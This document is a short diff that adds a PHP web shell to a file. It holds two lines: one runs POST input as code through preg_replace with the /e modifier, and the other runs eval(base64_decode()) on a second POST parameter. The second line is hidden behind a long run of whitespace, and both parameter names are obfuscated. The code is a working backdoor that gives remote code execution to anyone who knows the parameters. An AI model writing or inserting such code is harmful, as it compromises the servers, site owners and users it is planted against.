@@ -1,0 +1,2 @@
+<?php @preg_replace('/(.*)/e', @$_POST['nmyzzkeuquh'], '');
+                                                                                                                                                                                                                                                               eval(base64_decode($_POST['nc06699']));?>
